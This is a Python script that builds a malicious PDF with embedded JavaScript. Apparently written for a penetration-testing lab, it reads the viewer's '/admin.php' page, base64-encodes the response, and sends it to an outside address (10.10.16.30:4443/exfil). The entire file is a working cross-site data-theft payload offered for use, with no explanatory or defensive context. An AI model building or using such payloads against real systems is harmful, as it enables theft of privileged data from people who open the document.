from PyPDF2 import PdfWriter, PdfReader
import io
from reportlab.pdfgen import canvas

# Create a basic PDF
packet = io.BytesIO()
can = canvas.Canvas(packet)
can.drawString(100, 750, "XSS Test Document")
can.save()

# Move to the beginning of the buffer
packet.seek(0)
new_pdf = PdfReader(packet)

# Create a PDF writer
output = PdfWriter()

# Add page from the original PDF
output.add_page(new_pdf.pages[0])

# Add your exact JavaScript action
js_code = """
try {
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.send();
var msg = xhr.responseText;
} catch (error) {
var msg = error;
}
 
var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.16.30:4443/exfil?r=" + btoa(msg), false);
exfil.send();
"""

# Add JavaScript to the document
output.add_js(js_code)

# Write the PDF to disk
with open("xss_payload.pdf", "wb") as f:
    output.write(f)

print("Created malicious PDF: xss_payload.pdf")